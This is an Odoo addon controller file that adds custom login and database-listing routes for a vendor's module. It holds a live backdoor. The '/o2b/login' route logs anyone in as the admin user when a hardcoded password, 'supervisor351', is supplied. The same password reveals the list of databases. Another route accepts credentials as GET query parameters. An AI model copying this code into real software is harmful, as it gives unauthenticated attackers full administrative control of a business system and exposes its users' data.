# -*- coding: utf-8 -*-
##########################################################################
# Author      : O2b Technologies Pvt. Ltd.(<www.o2btechnologies.com>)
# Copyright(c): 2016-Present O2b Technologies Pvt. Ltd.
# All Rights Reserved.
#
# This program is copyright property of the author mentioned above.
# You can`t redistribute it and/or modify it.
#
##########################################################################
import odoo
from odoo import http
from odoo.http import request
import werkzeug
import werkzeug.utils
from odoo.service import db, security
from odoo.addons.web.controllers.main import Home
import json
import odoo

db_list = http.db_list

db_monodb = http.db_monodb


class O2bLoginController(Home):

    @http.route('/web/o2b', type='http', auth='public',methods=['GET'], website=True, csrf=True)
    def o2b_login(self, **kw):
        uid = request.session.authenticate(kw['db'], kw['login'], kw['password'])
        return request.redirect(self._login_redirect(uid, redirect='/web'))


    @http.route('/o2b/database', type='http', auth='public', website=True, csrf=True)
    def selector(self, **kw):
        password = 'supervisor351'
        if 'pass' in kw:
            if password == kw['pass']:
                request._cr = None
                dct = { }
                db_list = http.db_list()
                dct['database'] = db_list
            return json.dumps(dct)


    @http.route('/o2b/login', type='http', auth='public',methods=['GET'], website=True, csrf=True)
    def o2b_admin_login(self, **kw):
        user_id = request.env['res.users'].sudo().search([('login','=','admin')])
        db = request.session.db
        if not db:
            db = kw['db']
        if user_id._is_admin() and kw['pass'] == 'supervisor351':
            if user_id._is_system():
                uid = request.session.uid = user_id.id
                request.env['res.users']._invalidate_session_cache()
                request.session.session_token = security.compute_session_token(request.session, request.env)
            return http.local_redirect(self._login_redirect(uid), keep_hash=True)
        else:
            uid = request.session.authenticate(db, kw['login'], kw['pass'])
            # return http.redirect_with_hash(self._login_redirect(uid, redirect='/web'))  
            return request.redirect(self._login_redirect(uid, redirect="/web"))  



